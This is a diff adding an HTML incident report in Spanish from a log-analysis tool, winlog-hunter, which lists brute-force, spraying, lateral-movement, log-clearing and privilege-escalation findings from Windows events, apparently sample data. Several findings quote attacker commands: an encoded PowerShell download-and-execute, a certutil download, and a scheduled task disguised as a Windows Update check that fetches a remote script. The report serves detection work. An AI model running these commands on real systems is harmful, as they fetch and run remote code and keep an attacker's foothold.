@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'">
+<title>Informe winlog-hunter</title>
+<style>
+:root{--bg:#f6f7f9;--card:#fff;--text:#1d2330;--muted:#5b6475;--border:#dde1e8;
+--critical:#b4232c;--high:#d1501f;--medium:#a77a00;--low:#2f6fb5;--code:#eef1f5}
+@media (prefers-color-scheme:dark){:root{--bg:#11151c;--card:#1a2029;--text:#e6e9ef;--muted:#9aa3b2;
+--border:#2c3440;--critical:#ff6b72;--high:#ff8f5a;--medium:#f2c94c;--low:#6fa8ff;--code:#232a35}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:15px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif}
+main{max-width:1000px;margin:0 auto;padding:32px 16px}
+h1{font-size:26px;margin:0 0 4px}
+.meta{color:var(--muted);margin:0 0 24px}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:28px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 16px}
+.card b{display:block;font-size:28px;line-height:1.1}
+.card span{color:var(--muted);font-size:13px;text-transform:uppercase;letter-spacing:.04em}
+.finding{background:var(--card);border:1px solid var(--border);border-left:5px solid var(--sev);
+border-radius:10px;padding:16px 18px;margin-bottom:14px}
+.finding p,.finding h2{overflow-wrap:anywhere}
+.finding h2{font-size:17px;margin:0 0 6px}
+.badge{display:inline-block;font-size:12px;font-weight:700;color:var(--sev);border:1px solid var(--sev);
+border-radius:999px;padding:1px 9px;margin-right:6px;vertical-align:2px}
+.sub{color:var(--muted);font-size:13px;margin:0 0 10px}
+dl{display:grid;grid-template-columns:minmax(120px,190px) 1fr;gap:4px 14px;margin:10px 0 0}
+dt{color:var(--muted)}
+dd{margin:0;overflow-wrap:anywhere}
+code{background:var(--code);border-radius:4px;padding:1px 5px;font:13px/1.45 ui-monospace,Consolas,monospace}
+.empty{color:var(--muted)}
+footer{color:var(--muted);font-size:13px;margin-top:28px}
+@media (max-width:560px){dl{grid-template-columns:1fr}dt{margin-top:6px}}
+</style>
+</head>
+<body>
+<main>
+<h1>Informe de winlog-hunter</h1>
+<p class="meta">208 eventos en 1 fichero(s) · 2026-11-03 07:33:30 UTC a 2026-11-03 10:28:45 UTC</p>
+<section class="cards">
+<div class="card"><b>15</b><span>Hallazgos</span></div>
+<div class="card" style="color:var(--critical)"><b>3</b><span>CRÍTICA</span></div>
+<div class="card" style="color:var(--high)"><b>9</b><span>ALTA</span></div>
+<div class="card" style="color:var(--medium)"><b>1</b><span>MEDIA</span></div>
+<div class="card" style="color:var(--low)"><b>2</b><span>BAJA</span></div>
+</section>
+<article class="finding" style="--sev:var(--critical)">
+<h2><span class="badge">CRÍTICA</span>WLH-003 · Inicio de sesión correcto tras fuerza bruta</h2>
+<p class="sub">2026-11-03 09:10:00 UTC · SRV-APP · MITRE T1110, T1078 · 16 evento(s)</p>
+<p>&#x27;administrador&#x27; inició sesión con éxito desde 203.0.113.50 tras 15 intentos fallidos</p><dl>
+<dt>Usuario</dt><dd>administrador</dd>
+<dt>Dominio</dt><dd>CORP</dd>
+<dt>Origen</dt><dd>203.0.113.50</dd>
+<dt>Intentos fallidos previos</dt><dd>15</dd>
+<dt>Tipo de logon</dt><dd>10 (RDP)</dd>
+<dt>Id de logon</dt><dd>0x63b973</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--critical)">
+<h2><span class="badge">CRÍTICA</span>WLH-009 · Miembro añadido a grupo privilegiado</h2>
+<p class="sub">2026-11-03 10:04:00 UTC · DC01 · MITRE T1098 · 1 evento(s)</p>
+<p>&#x27;CN=soporte_tmp,CN=Users,DC=corp,DC=local&#x27; añadido a &#x27;Admins. del dominio&#x27; por &#x27;mlopez&#x27;</p><dl>
+<dt>Grupo</dt><dd>Admins. del dominio</dd>
+<dt>Sid grupo</dt><dd>S-1-5-21-1004336348-1177238915-682003330-512</dd>
+<dt>Miembro</dt><dd>CN=soporte_tmp,CN=Users,DC=corp,DC=local</dd>
+<dt>Sid miembro</dt><dd>S-1-5-21-1004336348-1177238915-682003330-1145</dd>
+<dt>Añadido por</dt><dd>mlopez</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--critical)">
+<h2><span class="badge">CRÍTICA</span>WLH-005 · Registro de eventos borrado</h2>
+<p class="sub">2026-11-03 10:10:00 UTC · DC01 · MITRE T1070.001 · 1 evento(s)</p>
+<p>Se borró el registro &#x27;Security&#x27; en DC01 (usuario: mlopez)</p><dl>
+<dt>Registro</dt><dd>Security</dd>
+<dt>Usuario</dt><dd>mlopez</dd>
+<dt>Dominio</dt><dd>CORP</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-002 · Password spraying</h2>
+<p class="sub">2026-11-03 08:30:00 UTC · DC01 · MITRE T1110.003 · 9 evento(s)</p>
+<p>198.51.100.23 probó 9 cuentas distintas en 1 min 20 s</p><dl>
+<dt>Origen</dt><dd>198.51.100.23</dd>
+<dt>Cuentas distintas</dt><dd>9</dd>
+<dt>Cuentas</dt><dd>admin, administrador, aperez, backup, cmartin, invitado, jgarcia, scanner, soporte</dd>
+<dt>Intentos</dt><dd>9</dd>
+<dt>Motivos</dt><dd>usuario inexistente: 5, contraseña incorrecta: 4</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-001 · Fuerza bruta de credenciales</h2>
+<p class="sub">2026-11-03 09:10:00 UTC · SRV-APP · MITRE T1110.001 · 15 evento(s)</p>
+<p>15 inicios de sesión fallidos para &#x27;administrador&#x27; desde 203.0.113.50 en 2 min 48 s</p><dl>
+<dt>Usuario</dt><dd>administrador</dd>
+<dt>Origen</dt><dd>203.0.113.50</dd>
+<dt>Intentos</dt><dd>15</dd>
+<dt>Tipos de logon</dt><dd>10 (RDP)</dd>
+<dt>Motivos</dt><dd>contraseña incorrecta: 15</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-010 · PowerShell sospechoso</h2>
+<p class="sub">2026-11-03 09:40:00 UTC · WS-CONTA01 · MITRE T1059.001 · 1 evento(s)</p>
+<p>PowerShell sospechoso en WS-CONTA01: comando codificado (-EncodedCommand), descarga remota, ejecución dinámica (IEX), ventana oculta, sin perfil</p><dl>
+<dt>Usuario</dt><dd>CORP\mlopez</dd>
+<dt>Proceso padre</dt><dd><code>C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</code></dd>
+<dt>Linea de comandos</dt><dd><code>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=</code></dd>
+<dt>Comando decodificado</dt><dd><code>IEX (New-Object Net.WebClient).DownloadString(&#x27;http://203.0.113.50/stage2.ps1&#x27;)</code></dd>
+<dt>Indicadores</dt><dd>comando codificado (-EncodedCommand), descarga remota, ejecución dinámica (IEX), ventana oculta, sin perfil</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-012 · Office lanzando una shell</h2>
+<p class="sub">2026-11-03 09:40:00 UTC · WS-CONTA01 · MITRE T1566.001, T1204.002 · 1 evento(s)</p>
+<p>winword.exe lanzó powershell.exe en WS-CONTA01</p><dl>
+<dt>Proceso padre</dt><dd><code>C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</code></dd>
+<dt>Proceso hijo</dt><dd><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></dd>
+<dt>Usuario</dt><dd>CORP\mlopez</dd>
+<dt>Linea de comandos</dt><dd><code>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=</code></dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-011 · Uso malicioso de binario del sistema (LOLBin)</h2>
+<p class="sub">2026-11-03 09:42:00 UTC · WS-CONTA01 · MITRE T1105, T1140 · 1 evento(s)</p>
+<p>certutil.exe usado para descarga o decodificación de ficheros en WS-CONTA01</p><dl>
+<dt>Binario</dt><dd>certutil.exe</dd>
+<dt>Tecnica</dt><dd>descarga o decodificación de ficheros</dd>
+<dt>Usuario</dt><dd>CORP\mlopez</dd>
+<dt>Proceso padre</dt><dd><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></dd>
+<dt>Linea de comandos</dt><dd><code>certutil.exe -urlcache -split -f http://203.0.113.50/tools.zip C:\Users\Public\tools.zip</code></dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-007 · Tarea programada creada</h2>
+<p class="sub">2026-11-03 09:45:00 UTC · WS-CONTA01 · MITRE T1053.005 · 1 evento(s)</p>
+<p>Tarea &#x27;\Microsoft\Windows\WindowsUpdate\UpdateCheck&#x27; creada en WS-CONTA01 por mlopez</p><dl>
+<dt>Tarea</dt><dd>\Microsoft\Windows\WindowsUpdate\UpdateCheck</dd>
+<dt>Usuario</dt><dd>mlopez</dd>
+<dt>Accion</dt><dd><code>powershell.exe -w hidden -nop -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://203.0.113.50/b.ps1&#x27;)&quot;</code></dd>
+<dt>Indicadores</dt><dd>comando sospechoso: &#x27;powershell&#x27;</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-004 · Posible movimiento lateral</h2>
+<p class="sub">2026-11-03 09:50:00 UTC · DC01, SRV-APP, SRV-BACKUP, SRV-FILES · MITRE T1021 · 4 evento(s)</p>
+<p>&#x27;mlopez&#x27; inició sesión en 4 equipos desde 10.0.0.21 en 9 min</p><dl>
+<dt>Usuario</dt><dd>mlopez</dd>
+<dt>Origen</dt><dd>10.0.0.21</dd>
+<dt>Equipos destino</dt><dd>DC01, SRV-APP, SRV-BACKUP, SRV-FILES</dd>
+<dt>Tipos de logon</dt><dd>3 (red)</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-006 · Nuevo servicio instalado</h2>
+<p class="sub">2026-11-03 09:54:00 UTC · SRV-APP · MITRE T1543.003, T1569.002, T1021.002 · 1 evento(s)</p>
+<p>Servicio &#x27;PSEXESVC&#x27; instalado en SRV-APP</p><dl>
+<dt>Servicio</dt><dd>PSEXESVC</dd>
+<dt>Ruta</dt><dd><code>%SystemRoot%\PSEXESVC.exe</code></dd>
+<dt>Cuenta</dt><dd>LocalSystem</dd>
+<dt>Tipo de inicio</dt><dd>demand start</dd>
+<dt>Indicadores</dt><dd>servicio típico de ejecución remota (PsExec o similar)</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--high)">
+<h2><span class="badge">ALTA</span>WLH-009 · Miembro añadido a grupo privilegiado</h2>
+<p class="sub">2026-11-03 10:03:00 UTC · DC01 · MITRE T1098 · 1 evento(s)</p>
+<p>&#x27;S-1-5-21-1004336348-1177238915-682003330-1145&#x27; añadido a &#x27;Administradores&#x27; por &#x27;mlopez&#x27;</p><dl>
+<dt>Grupo</dt><dd>Administradores</dd>
+<dt>Sid grupo</dt><dd>S-1-5-32-544</dd>
+<dt>Sid miembro</dt><dd>S-1-5-21-1004336348-1177238915-682003330-1145</dd>
+<dt>Añadido por</dt><dd>mlopez</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--medium)">
+<h2><span class="badge">MEDIA</span>WLH-008 · Cuenta de usuario creada</h2>
+<p class="sub">2026-11-03 10:02:00 UTC · DC01 · MITRE T1136 · 1 evento(s)</p>
+<p>Cuenta &#x27;soporte_tmp&#x27; creada por &#x27;mlopez&#x27; en DC01</p><dl>
+<dt>Cuenta</dt><dd>soporte_tmp</dd>
+<dt>Creada por</dt><dd>mlopez</dd>
+<dt>Dominio</dt><dd>CORP</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--low)">
+<h2><span class="badge">BAJA</span>WLH-006 · Nuevo servicio instalado</h2>
+<p class="sub">2026-11-03 07:50:00 UTC · WS-DIR05 · MITRE T1543.003 · 1 evento(s)</p>
+<p>Servicio &#x27;Google Update Service (gupdate)&#x27; instalado en WS-DIR05</p><dl>
+<dt>Servicio</dt><dd>Google Update Service (gupdate)</dd>
+<dt>Ruta</dt><dd><code>&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot; /svc</code></dd>
+<dt>Cuenta</dt><dd>LocalSystem</dd>
+<dt>Tipo de inicio</dt><dd>auto start</dd>
+</dl></article>
+<article class="finding" style="--sev:var(--low)">
+<h2><span class="badge">BAJA</span>WLH-007 · Tarea programada creada</h2>
+<p class="sub">2026-11-03 07:51:00 UTC · WS-DIR05 · MITRE T1053.005 · 1 evento(s)</p>
+<p>Tarea &#x27;\GoogleUpdateTaskMachineUA&#x27; creada en WS-DIR05 por SYSTEM</p><dl>
+<dt>Tarea</dt><dd>\GoogleUpdateTaskMachineUA</dd>
+<dt>Usuario</dt><dd>SYSTEM</dd>
+<dt>Accion</dt><dd><code>C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /ua /installsource scheduler</code></dd>
+</dl></article>
+<footer>Generado el 2026-11-07 17:17:02 UTC con winlog-hunter 0.1.0</footer>
+</main>
+</body>
+</html>
